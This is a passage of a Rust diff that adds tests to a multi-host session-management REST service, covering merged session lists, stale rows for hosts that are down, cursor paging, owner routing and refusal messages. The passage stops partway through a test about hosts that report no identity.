-    /// supervisor's message verbatim — the pinned REST contract's
+    /// A `BeginUpload` refusal (admission cap, a vanished attachments
+    /// directory, any supervisor-side precondition) must reach the browser
+    /// through the same `http_error` mapping every other endpoint uses,
+    /// with the supervisor's message verbatim — the pinned REST contract's
     /// "sentinel-testable" promise, exercised here specifically for the
     /// attachments route rather than assumed from the other endpoints'
     /// coverage.
+    ///
+    /// Deliberately aimed at a session the helm DOES know (PLAN_M6.md item
+    /// 5): an id the merged view has never heard of is now refused by the
+    /// helm's own owner lookup before any host is contacted, so pointing
+    /// this at one would test the helm's 404 rather than the passthrough it
+    /// exists to pin.
     #[tokio::test]
     async fn upload_attachment_begin_error_reply_passes_through_the_sentinel_message() {
         use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
         use farhelm_proto::{ControlMsg, ErrorKind};
         use tower::ServiceExt;
 
-        const SENTINEL: &str = "SENTINEL-begin-upload-7a2c9f: no such session";
+        const SENTINEL: &str = "SENTINEL-begin-upload-7a2c9f: the attachments directory is gone";
 
         let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
         let peer = tokio::spawn(async move {
@@ -5612,13 +6122,12 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
-            .uri("/api/sessions/sess-missing/attachments")
+            .uri("/api/sessions/sess-1/attachments")
             .header("host", "127.0.0.1:7433")
             .header("content-length", "3")
             .body(axum::body::Body::from(vec![1u8, 2, 3]))
@@ -5680,9 +6189,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -5726,9 +6234,8 @@ mod tests {
             (reader, writer)
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         // Built with no Content-Length at all: the request builder sets
         // no headers of its own, and `Body::from` only gives the body an
@@ -5807,9 +6314,8 @@ mod tests {
                     .unwrap();
             });
 
-            let (r, w) = tokio::io::split(client_side);
-            let client = super::SupervisorClient::start(r, w).await.unwrap();
-            let addr = serve_helm(client).await;
+            let mut harness = rest_harness::spliced_helm(client_side).await;
+            let addr = harness.serve().await;
             let path = format!("/api/sessions/sess-1/term{query}");
             let (_ws, peer) = tokio::join!(WsTestClient::connect(addr, &path), peer);
             peer.unwrap();
@@ -5854,9 +6360,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let addr = serve_helm(client).await;
+        let mut harness = rest_harness::spliced_helm(client_side).await;
+        let addr = harness.serve().await;
         let (_ws, peer) = tokio::join!(
             WsTestClient::connect(addr, "/api/sessions/sess-1/term?tab=tab-1&lease=client-abc"),
             peer
@@ -5914,9 +6419,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let addr = serve_helm(client).await;
+        let mut harness = rest_harness::spliced_helm(client_side).await;
+        let addr = harness.serve().await;
         let (mut ws, peer) = tokio::join!(
             WsTestClient::connect(addr, "/api/sessions/sess-1/term?tab=no-such-tab"),
             peer
@@ -5977,9 +6481,8 @@ mod tests {
             reader
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let addr = serve_helm(client).await;
+        let mut harness = rest_harness::spliced_helm(client_side).await;
+        let addr = harness.serve().await;
         let mut ws = WsTestClient::connect(addr, "/api/sessions/sess-1/term?lease=").await;
 
         let (opcode, payload) = tokio::time::timeout(Duration::from_secs(5), ws.recv())
@@ -6020,6 +6523,1920 @@ mod tests {
             got.is_err(),
             "an Attach reached the supervisor for an explicitly empty ?lease=, which must be \
              refused locally instead"
+        );
+    }
+
+    // ---- Multi-host aggregation and routing (PLAN_M6.md item 5) ------
+    //
+    // Everything below stands the real serving path up over a scripted
+    // FLEET rather than one connection (see `rest_harness`), because the
+    // properties are about more than one host at a time: which rows appear
+    // together and in what order, which of them are stale, and which host
+    // an operation reaches.
+
+    /// Issue one request against `app` and return its status and JSON body.
+    ///
+    /// The tests below make several requests each and none of them is about
+    /// HTTP mechanics, so the builder boilerplate lives here once.
+    async fn get_json(
+        harness: &rest_harness::Harness,
+        uri: &str,
+    ) -> (axum::http::StatusCode, serde_json::Value) {
+        let request = axum::http::Request::builder()
+            .method("GET")
+            .uri(uri)
+            .header("host", "127.0.0.1:7433")
+            .body(axum::body::Body::empty())
+            .unwrap();
+        let response = tower::ServiceExt::oneshot(harness.router(), request)
+            .await
+            .unwrap();
+        let status = response.status();
+        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
+            .await
+            .unwrap();
+        let value = serde_json::from_slice(&body)
+            .unwrap_or_else(|_| serde_json::Value::String(String::from_utf8_lossy(&body).into()));
+        (status, value)
+    }
+
+    /// POST with a JSON body, returning the status and the body as text —
+    /// the shape every refusal assertion below needs, since a refusal's
+    /// body is prose rather than JSON.
+    async fn post_text(
+        harness: &rest_harness::Harness,
+        uri: &str,
+        body: serde_json::Value,
+    ) -> (axum::http::StatusCode, String) {
+        let request = axum::http::Request::builder()
+            .method("POST")
+            .uri(uri)
+            .header("host", "127.0.0.1:7433")
+            .header("content-type", "application/json")
+            .body(axum::body::Body::from(body.to_string()))
+            .unwrap();
+        let response = tower::ServiceExt::oneshot(harness.router(), request)
+            .await
+            .unwrap();
+        let status = response.status();
+        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
+            .await
+            .unwrap();
+        (status, String::from_utf8_lossy(&body).into_owned())
+    }
+
+    /// The `id` of every row of a session-list body, in order.
+    fn row_ids(value: &serde_json::Value) -> Vec<String> {
+        value["sessions"]
+            .as_array()
+            .expect("sessions is an array")
+            .iter()
+            .map(|row| row["id"].as_str().expect("id is a string").to_string())
+            .collect()
+    }
+
+    /// A three-host fleet where every host has sessions, sharing one
+    /// interleaved creation order — the fixture the merge, ordering, and
+    /// staleness assertions all need.
+    ///
+    /// The interleaving is the point: `created_at` values alternate between
+    /// hosts, so a merge that concatenated per-host lists (or sorted only
+    /// within a host) would produce a visibly different order rather than
+    /// happening to agree.
+    async fn three_host_fleet() -> (
+        rest_harness::Harness,
+        crate::store::HostId,
+        crate::store::HostId,
+    ) {
+        let (builder, alpha) = rest_harness::FleetBuilder::new()
+            .await
+            .local(rest_harness::HostScript {
+                identity: Some("identity-local".to_string()),
+                sessions: vec![rest_harness::session("local-mid", 200)],
+                ..rest_harness::HostScript::default()
+            })
+            .await
+            .ssh(
+                "user@alpha",
+                rest_harness::HostScript {
+                    identity: Some("identity-alpha".to_string()),
+                    sessions: vec![
+                        rest_harness::session("alpha-new", 300),
+                        rest_harness::session("alpha-old", 100),
+                    ],
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let (builder, beta) = builder
+            .ssh(
+                "user@beta",
+                rest_harness::HostScript {
+                    identity: Some("identity-beta".to_string()),
+                    sessions: vec![
+                        rest_harness::session("beta-newest", 400),
+                        rest_harness::session("beta-oldest", 50),
+                    ],
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        let local = rest_harness::local_id(&harness.store).await;
+        for host in [local, alpha, beta] {
+            harness.await_refreshed(host).await;
+        }
+        (harness, alpha, beta)
+    }
+
+    /// The merged list is ONE list: every connected host's sessions in a
+    /// single creation-time order, each row naming its host.
+    ///
+    /// SPEC.md promises "one flat list across all registered hosts, with
+    /// each row saying which host it lives on", and the ordering half is
+    /// what makes it a list rather than a concatenation. The fixture
+    /// interleaves creation times across hosts specifically so a
+    /// per-host-then-append implementation fails here instead of passing by
+    /// coincidence.
+    #[tokio::test]
+    async fn the_session_list_merges_every_host_into_one_creation_order() {
+        let (harness, alpha, beta) = three_host_fleet().await;
+        let local = rest_harness::local_id(&harness.store).await;
+
+        let (status, value) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(status, axum::http::StatusCode::OK);
+        assert_eq!(
+            row_ids(&value),
+            vec![
+                "beta-newest",
+                "alpha-new",
+                "local-mid",
+                "alpha-old",
+                "beta-oldest"
+            ],
+            "the merge is creation-time descending across hosts, not host by host"
+        );
+        assert_eq!(value["total"], 5, "total is the merged count");
+
+        let rows = value["sessions"].as_array().unwrap();
+        assert_eq!(rows[0]["host"], beta);
+        assert_eq!(rows[0]["host_name"], "user@beta");
+        assert_eq!(rows[1]["host"], alpha);
+        assert_eq!(rows[1]["host_name"], "user@alpha");
+        assert_eq!(rows[2]["host"], local);
+        assert_eq!(
+            rows[2]["host_name"], "this machine",
+            "the helm's own machine is described rather than addressed"
+        );
+        assert!(
+            rows.iter().all(|row| row["stale"] == false),
+            "every host is connected, so nothing is last-known knowledge"
+        );
+    }
+
+    /// A host going dark must not remove its sessions from the list: they
+    /// stay, marked stale, while every other host's rows keep their place
+    /// in the same order.
+    ///
+    /// This is SPEC.md's central multi-host promise — "sessions on an
+    /// unreachable host stay in the list from the helm's last-known
+    /// knowledge, clearly marked stale, rather than vanishing" — at the
+    /// REST boundary, where the UI actually reads it.
+    #[tokio::test]
+    async fn a_down_hosts_sessions_stay_listed_and_marked_stale() {
+        let (harness, alpha, beta) = three_host_fleet().await;
+
+        harness.fleet.take_down(beta);
+        harness
+            .await_state(beta, |state| state.phase() == "unreachable-reprobing")
+            .await;
+
+        let (status, value) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(status, axum::http::StatusCode::OK);
+        assert_eq!(
+            row_ids(&value),
+            vec![
+                "beta-newest",
+                "alpha-new",
+                "local-mid",
+                "alpha-old",
+                "beta-oldest"
+            ],
+            "a down host's rows keep their place in the merged order"
+        );
+        let rows = value["sessions"].as_array().unwrap();
+        for row in rows {
+            let expected_stale = row["host"] == beta;
+            assert_eq!(
+                row["stale"], expected_stale,
+                "only the down host's rows are stale: {row}"
+            );
+        }
+        assert_eq!(
+            rows[1]["host"], alpha,
+            "one host going down must not disturb another's rows"
+        );
+    }
+
+    /// The helm-level cursor walks the MERGED order to exhaustion, page by
+    /// page, crossing host boundaries mid-page without any host being asked
+    /// anything.
+    ///
+    /// The decoupling PLAN_M6.md item 5 requires is what makes this
+    /// possible at all: the pages come from helm.db, so a page boundary can
+    /// fall anywhere in the merged order rather than being pinned to where
+    /// some host's own wire page happened to end.
+    #[tokio::test]
+    async fn the_helm_cursor_walks_the_merged_order_across_host_boundaries() {
+        let (harness, _alpha, _beta) = three_host_fleet().await;
+
+        let mut walked: Vec<String> = Vec::new();
+        let mut uri = "/api/sessions?limit=2".to_string();
+        for _ in 0..10 {
+            let (status, value) = get_json(&harness, &uri).await;
+            assert_eq!(status, axum::http::StatusCode::OK);
+            assert_eq!(value["total"], 5, "every page reports the merged total");
+            walked.extend(row_ids(&value));
+            match value["next_cursor"].as_str() {
+                None => break,
+                Some(cursor) => uri = format!("/api/sessions?limit=2&cursor={cursor}"),
+            }
+        }
+        assert_eq!(
+            walked,
+            vec![
+                "beta-newest",
+                "alpha-new",
+                "local-mid",
+                "alpha-old",
+                "beta-oldest"
+            ],
+            "the walk must reproduce the whole merged order exactly once"
+        );
+
+        let (status, body) = get_json(&harness, "/api/sessions?cursor=not-a-cursor").await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::BAD_REQUEST,
+            "a tampered cursor is a clean refusal: {body}"
+        );
+        let (status, _) = get_json(&harness, "/api/sessions?limit=0").await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::BAD_REQUEST,
+            "a zero limit could never make progress through the pages"
+        );
+    }
+
+    /// A session operation must reach the host that OWNS the session, and
+    /// only that host.
+    ///
+    /// The assertion needs two live hosts, because a single-host fleet
+    /// cannot distinguish "routed correctly" from "sent to the only
+    /// connection there is" — which is exactly the bug this whole lookup
+    /// exists to prevent once a fleet has more than one member.
+    #[tokio::test]
+    async fn a_session_operation_routes_to_the_host_that_owns_it() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        // The host that must NOT be asked, and the one that must.
+        let (alpha_client, alpha_peer) = tokio::io::duplex(64 * 1024);
+        let alpha_task = tokio::spawn(silent_supervisor(alpha_peer));
+        let (beta_client, beta_peer) = tokio::io::duplex(64 * 1024);
+        let beta_task = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(beta_peer);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
+            let ControlMsg::StopSession { req_id, session_id } = request else {
+                panic!("expected StopSession, got {request:?}");
+            };
+            assert_eq!(session_id, "beta-1");
+            writer
+                .write_control(&ControlMsg::SessionStopped { req_id })
+                .await
+                .unwrap();
+        });
+
+        let (builder, alpha) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@alpha",
+                rest_harness::HostScript {
+                    identity: Some("identity-alpha".to_string()),
+                    sessions: vec![rest_harness::session("alpha-1", 100)],
+                    peer: Some(alpha_client),
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let (builder, beta) = builder
+            .ssh(
+                "user@beta",
+                rest_harness::HostScript {
+                    identity: Some("identity-beta".to_string()),
+                    sessions: vec![rest_harness::session("beta-1", 200)],
+                    peer: Some(beta_client),
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        harness.await_refreshed(alpha).await;
+        harness.await_refreshed(beta).await;
+
+        let (status, body) =
+            post_text(&harness, "/api/sessions/beta-1/stop", serde_json::json!({})).await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+
+        beta_task.await.unwrap();
+        alpha_task.await.unwrap();
+    }
+
+    /// Every non-connected state refuses a session operation, names itself
+    /// in the error, and queues nothing.
+    ///
+    /// Three states are reached the way they are reached in life — a host
+    /// switched off, a host upgraded past this helm's protocol, a host
+    /// reinstalled under a new identity — and the assertion is deliberately
+    /// uniform across them. SPEC.md refuses lifecycle operations against an
+    /// unreachable host; PLAN_M6.md item 5 makes explicit that unreachable
+    /// is not special, only common, and that all of these refuse alike. A
+    /// helm that special-cased one of them would pass a test written per
+    /// state and fail this one.
+    ///
+    /// The other three states — `connecting`, `duplicate`, `retired` — are
+    /// covered by `refusal_text_names_every_non_connected_state` rather than
+    /// here. Reaching them through the integration path is either
+    /// impractical (a connecting host has to be caught mid-ladder) or
+    /// meaningless for a SESSION operation (a duplicate entry and a retired
+    /// one connect nothing, so they can never have cached a session to
+    /// operate on). What actually has to hold for all six is that the
+    /// refusal names the state, and that is what the sibling test pins —
+    /// against the same function this path uses.
+    ///
+    /// Each host CONNECTS first, so its session is genuinely in the merged
+    /// view before the host breaks — otherwise there would be nothing to
+    /// operate on and the 409 under test would be a 404 instead.
+    #[tokio::test]
+    async fn every_non_connected_state_refuses_a_session_operation_naming_itself() {
+        struct Case {
+            /// How the far side changes under the host's feet.
+            break_it: fn(&rest_harness::ScriptedFleet, crate::store::HostId),
+            /// The phase label the refusal must carry — the same
+            /// vocabulary `/api/hosts` chips and the log lines use.
+            phase: &'static str,
+        }
+
+        let cases = [
+            Case {
+                break_it: |fleet, host| fleet.take_down(host),
+                phase: "unreachable-reprobing",
+            },
+            Case {
+                break_it: |fleet, host| {
+                    fleet.edit(host, |script| {
+                        script.protocol = farhelm_proto::PROTOCOL_VERSION + 1;
+                    });
+                    fleet.kill_connection(host);
+                },
+                phase: "version-skew",
+            },
+            Case {
+                break_it: |fleet, host| {
+                    fleet.edit(host, |script| {
+                        script.identity = Some("a-different-install".to_string());
+                    });
+                    fleet.kill_connection(host);
+                },
+                phase: "identity-mismatch",
+            },
+        ];
+
+        for case in cases {
+            let (builder, host) = rest_harness::FleetBuilder::new()
+                .await
+                .ssh(
+                    "user@breaks",
+                    rest_harness::HostScript {
+                        identity: Some("identity-original".to_string()),
+                        sessions: vec![rest_harness::session("owned", 100)],
+                        ..rest_harness::HostScript::default()
+                    },
+                )
+                .await;
+            let harness = builder.start().await;
+            harness.await_refreshed(host).await;
+
+            (case.break_it)(&harness.fleet, host);
+            harness
+                .await_state(host, |state| state.phase() == case.phase)
+                .await;
+
+            let (status, body) =
+                post_text(&harness, "/api/sessions/owned/stop", serde_json::json!({})).await;
+            assert_eq!(
+                status,
+                axum::http::StatusCode::CONFLICT,
+                "a {} host must refuse rather than 404 or 500: {body}",
+                case.phase
+            );
+            assert!(
+                body.contains(case.phase),
+                "the refusal must name the host's state ({}): {body}",
+                case.phase
+            );
+            assert!(
+                body.contains("nothing was queued"),
+                "the refusal must say nothing was deferred: {body}"
+            );
+
+            // Still listed, and still marked as what it is: refusing an
+            // operation must not make the session disappear.
+            let (_, value) = get_json(&harness, "/api/sessions").await;
+            assert_eq!(row_ids(&value), vec!["owned"]);
+            assert_eq!(value["sessions"][0]["stale"], true);
+        }
+    }
+
+    /// Every one of the six non-connected states must name itself in the
+    /// refusal, including the three the integration path above cannot
+    /// practically reach.
+    ///
+    /// Asserted against `refusal_text` directly — the single function every
+    /// refusal in this crate is built from — because what matters is that
+    /// no state falls through to a generic message. A seventh state added
+    /// later without a case here fails this test rather than silently
+    /// refusing operations with nothing a user can act on.
+    #[test]
+    fn refusal_text_names_every_non_connected_state() {
+        use crate::manager::{HostState, UnreachableCause};
+
+        let cases = [
+            (
+                HostState::Connecting {
+                    attempt: 2,
+                    last_error: Some("ssh: connect to host timed out".to_string()),
+                },
+                "connecting",
+                "timed out",
+            ),
+            (
+                HostState::Unreachable {
+                    cause: UnreachableCause::TransportFailure,
+                    last_error: "no route to host".to_string(),
+                },
+                "unreachable-reprobing",
+                "no route to host",
+            ),
+            (
+                HostState::VersionSkew {
+                    peer_protocol: 9,
+                    peer_build: "0.0.2".to_string(),
+                    our_protocol: 8,
+                    our_build: "0.0.1".to_string(),
+                    remediation: "update this helm".to_string(),
+                },
+                "version-skew",
+                "update this helm",
+            ),
+            (
+                HostState::IdentityMismatch {
+                    recorded: "identity-old".to_string(),
+                    reported: "identity-new".to_string(),
+                },
+                "identity-mismatch",
+                "identity-new",
+            ),
+            (
+                HostState::Duplicate {
+                    twin: 7,
+                    identity: "identity-shared".to_string(),
+                },
+                "duplicate",
+                "host 7",
+            ),
+            (
+                HostState::Retired {
+                    reason: "its connection actor panicked".to_string(),
+                },
+                "retired",
+                "panicked",
+            ),
+        ];
+        assert_eq!(
+            cases.len(),
+            6,
+            "all six non-connected states are covered; a seventh needs a case here"
+        );
+        for (state, phase, detail) in cases {
+            let text = super::refusal_text(42, &state);
+            assert!(
+                text.contains(phase),
+                "the refusal must name the phase {phase:?}: {text}"
+            );
+            assert!(
+                text.contains(detail),
+                "the refusal must carry the state's own evidence ({detail:?}): {text}"
+            );
+            assert!(
+                text.contains("nothing was queued"),
+                "every refusal must say nothing was deferred: {text}"
+            );
+            assert!(
+                text.contains("host 42"),
+                "every refusal must name the host: {text}"
+            );
+        }
+    }
+
+    /// Creating on a non-connected host is a PRECONDITION FAILURE: a
+    /// visible error naming the host's state, and no session anywhere.
+    ///
+    /// SPEC.md lists "unreachable host" beside "nonexistent directory" as a
+    /// precondition that fails a create outright, and the silent supervisor
+    /// is what turns "no session anywhere" into an assertion rather than a
+    /// claim — a helm that refused the caller but still sent the create
+    /// would leave a real agent running that nobody asked for.
+    #[tokio::test]
+    async fn creating_on_a_non_connected_host_is_refused_with_no_session() {
+        let (alpha_client, alpha_peer) = tokio::io::duplex(64 * 1024);
+        let alpha_task = tokio::spawn(silent_supervisor(alpha_peer));
+
+        let (builder, down) = rest_harness::FleetBuilder::new()
+            .await
+            .local(rest_harness::HostScript {
+                identity: Some("identity-local".to_string()),
+                peer: Some(alpha_client),
+                ..rest_harness::HostScript::default()
+            })
+            .await
+            .ssh(
+                "user@down",
+                rest_harness::HostScript {
+                    reachable: false,
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        let local = rest_harness::local_id(&harness.store).await;
+        harness.await_refreshed(local).await;
+        harness
+            .await_state(down, |state| state.phase() == "unreachable-reprobing")
+            .await;
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions",
+            serde_json::json!({
+                "cwd": "/tmp",
+                "invocation": "agent",
+                "host": down,
+            }),
+        )
+        .await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::CONFLICT,
+            "a create against a down host fails as a precondition: {body}"
+        );
+        assert!(
+            body.contains("unreachable-reprobing"),
+            "the error must name the host's state: {body}"
+        );
+
+        // The connected host must not have been used as a fallback: a
+        // create that silently landed somewhere else would be worse than
+        // one that failed.
+        alpha_task.await.unwrap();
+    }
+
+    /// A create that names no host lands on the reserved LOCAL row, and one
+    /// that names a host lands there instead.
+    ///
+    /// The default is the tail of SPEC.md's own creation default ("…else
+    /// the helm's own host"), and keeping it a default rather than a
+    /// requirement is what leaves a curl or a script meaning the obvious
+    /// thing. Both halves are asserted against a two-host fleet, since a
+    /// single-host fleet cannot tell a default from an accident.
+    #[tokio::test]
+    async fn a_create_defaults_to_the_local_host_and_honors_an_explicit_one() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        /// Answer one `CreateSession` with a session whose id says which
+        /// host answered.
+        async fn create_once(peer_side: tokio::io::DuplexStream, id: &'static str) {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
+            let ControlMsg::CreateSession { req_id, .. } = request else {
+                panic!("expected CreateSession, got {request:?}");
+            };
+            writer
+                .write_control(&ControlMsg::SessionCreated {
+                    req_id,
+                    session: rest_harness::session(id, 1),
+                })
+                .await
+                .unwrap();
+        }
+
+        for (explicit, expected) in [(false, "created-on-local"), (true, "created-on-remote")] {
+            let (local_client, local_peer) = tokio::io::duplex(64 * 1024);
+            let local_task = tokio::spawn(create_once(local_peer, "created-on-local"));
+            let (remote_client, remote_peer) = tokio::io::duplex(64 * 1024);
+            let remote_task = tokio::spawn(create_once(remote_peer, "created-on-remote"));
+
+            let (builder, remote) = rest_harness::FleetBuilder::new()
+                .await
+                .local(rest_harness::HostScript {
+                    identity: Some("identity-local".to_string()),
+                    peer: Some(local_client),
+                    ..rest_harness::HostScript::default()
+                })
+                .await
+                .ssh(
+                    "user@remote",
+                    rest_harness::HostScript {
+                        identity: Some("identity-remote".to_string()),
+                        peer: Some(remote_client),
+                        ..rest_harness::HostScript::default()
+                    },
+                )
+                .await;
+            let harness = builder.start().await;
+            let local = rest_harness::local_id(&harness.store).await;
+            harness.await_refreshed(local).await;
+            harness.await_refreshed(remote).await;
+
+            let mut body = serde_json::json!({ "cwd": "/tmp", "invocation": "agent" });
+            if explicit {
+                body["host"] = serde_json::json!(remote);
+            }
+            let (status, text) = post_text(&harness, "/api/sessions", body).await;
+            assert_eq!(status, axum::http::StatusCode::OK, "{text}");
+            let created: serde_json::Value = serde_json::from_str(&text).unwrap();
+            assert_eq!(
+                created["id"],
+                expected,
+                "a create with host {} must land on {expected}",
+                if explicit { "named" } else { "omitted" }
+            );
+
+            // Whichever peer was not chosen is still parked on its read;
+            // aborting is how this test declines to wait for it.
+            local_task.abort();
+            remote_task.abort();
+        }
+    }
+
+    /// A terminal socket for a session on a non-connected host must be
+    /// refused the same way every other operation is — and must SAY so, as
+    /// the ordinary `detached` notice, rather than closing bare.
+    ///
+    /// SPEC.md wants "no terminal to show and no pretense of one", and a
+    /// silent close is exactly a pretense the browser would blame on the
+    /// network. Riding the existing notice shape is also what lets the UI
+    /// render this without a new message type.
+    #[tokio::test]
+    async fn a_terminal_socket_on_a_down_host_is_refused_with_the_hosts_state() {
+        let (builder, host) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@breaks",
+                rest_harness::HostScript {
+                    identity: Some("identity-original".to_string()),
+                    sessions: vec![rest_harness::session("owned", 100)],
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let mut harness = builder.start().await;
+        harness.await_refreshed(host).await;
+        harness.fleet.take_down(host);
+        harness
+            .await_state(host, |state| state.phase() == "unreachable-reprobing")
+            .await;
+
+        let addr = harness.serve().await;
+        let mut ws = WsTestClient::connect(addr, "/api/sessions/owned/term").await;
+        let (opcode, payload) = ws.recv().await.expect("a notice, not a bare close");
+        assert_eq!(opcode, 1, "the refusal arrives as a text notice");
+        let notice: serde_json::Value = serde_json::from_slice(&payload).unwrap();
+        assert_eq!(notice["type"], "detached");
+        let reason = notice["reason"].as_str().unwrap();
+        assert!(
+            reason.contains("unreachable-reprobing"),
+            "the notice must name the host's state: {reason}"
+        );
+        assert!(
+            ws.recv().await.is_none(),
+            "the socket closes once its refusal is delivered"
+        );
+    }
+
+    /// A session created HERE must be operable at once — the create's own
+    /// reply is not a promise the helm may then take a refresh interval to
+    /// honour.
+    ///
+    /// This is a regression test for a real gap, not a hypothetical: owner
+    /// routing resolves hosts from the cache, and for a while `create`
+    /// never seeded it, so the create dialog's own flow — create, then open
+    /// the terminal — 404'd until the owning host's next refresh. Every
+    /// verb is exercised because they route through one lookup and the
+    /// failure was in the lookup, not in any one of them.
+    ///
+    /// No refresh tick is allowed to rescue it: the harness's cadence
+    /// refreshes once at connect and then not for an hour, so anything that
+    /// works here worked because the create seeded it.
+    #[tokio::test]
+    async fn a_session_created_here_is_routable_before_any_refresh() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let peer = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
+            // Create, then answer every later request for the session it
+            // just minted. The point is that these are REACHED at all.
+            loop {
+                let Ok(Some(frame)) = reader.read_frame().await else {
+                    return;
+                };
+                match parse_control(&frame) {
+                    Ok(ControlMsg::CreateSession { req_id, .. }) => writer
+                        .write_control(&ControlMsg::SessionCreated {
+                            req_id,
+                            session: rest_harness::session("brand-new", 900),
+                        })
+                        .await
+                        .unwrap(),
+                    Ok(ControlMsg::StopSession { req_id, session_id }) => {
+                        assert_eq!(session_id, "brand-new");
+                        writer
+                            .write_control(&ControlMsg::SessionStopped { req_id })
+                            .await
+                            .unwrap();
+                    }
+                    Ok(ControlMsg::RenameSession {
+                        req_id, session_id, ..
+                    }) => {
+                        assert_eq!(session_id, "brand-new");
+                        writer
+                            .write_control(&ControlMsg::SessionRenamed {
+                                req_id,
+                                session: rest_harness::session("brand-new", 900),
+                            })
+                            .await
+                            .unwrap();
+                    }
+                    _ => return,
+                }
+            }
+        });
+
+        // The scripted host's own list is EMPTY, so nothing but the create
+        // can put this session where routing will find it.
+        let harness = rest_harness::spliced_helm_listing(client_side, Vec::new()).await;
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions",
+            serde_json::json!({ "cwd": "/tmp", "invocation": "agent" }),
+        )
+        .await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+        let created: serde_json::Value = serde_json::from_str(&body).unwrap();
+        assert_eq!(created["id"], "brand-new");
+
+        for (uri, request_body) in [
+            ("/api/sessions/brand-new/stop", serde_json::json!({})),
+            (
+                "/api/sessions/brand-new/rename",
+                serde_json::json!({ "title": "renamed" }),
+            ),
+        ] {
+            let (status, body) = post_text(&harness, uri, request_body).await;
+            assert_eq!(
+                status,
+                axum::http::StatusCode::OK,
+                "{uri} must route immediately after the create that made it: {body}"
+            );
+        }
+
+        // Deliberately NOT asserted here: the detail route asks the owning
+        // host live rather than reading the cache, so what it reports is
+        // the scripted list (empty) and not the seed. That is the correct
+        // division — the seed exists to make the session ROUTABLE, and the
+        // host remains authority for what it is — and asserting otherwise
+        // would pin the cache as a detail-serving layer, which PLAN_M6.md
+        // explicitly rules out.
+        peer.abort();
+    }
+
+    /// A connected host reporting NO identity caches nothing, and its
+    /// sessions must still list and route — then vanish when it drops.
+    ///
+    /// The gap this closes was total and silent: the manager deliberately
+    /// skips persisting an identity-less host's refreshes (the cache write
+    /// is identity-bound), while aggregation and owner lookup read only
+    /// persisted rows — so such a host read as connected and EMPTY, with
+    /// its sessions absent from the list and unroutable for every
+    /// operation.
+    ///
+    /// The disappearance half is equally deliberate and is asserted here so
+    /// nobody "fixes" it later: with no durable copy there is nothing to
+    /// vouch for these rows once the connection is gone, so they must not
+    /// linger as stale entries the helm cannot stand behind.
+    #[tokio::test]
+    async fn an_identity_less_hosts_sessions_serve_while_connected_and_vanish_after() {
+        use farhelm_proto::ControlMsg;
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
+
+        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
+        let peer = tokio::spawn(async move {
+            let (r, w) = tokio::io::split(peer_side);
+            let mut reader = FrameReader::new(r);
+            let mut writer = FrameWriter::new(w);
+            handshake(&mut reader, &mut writer, "supervisor")
+                .await
+                .unwrap();
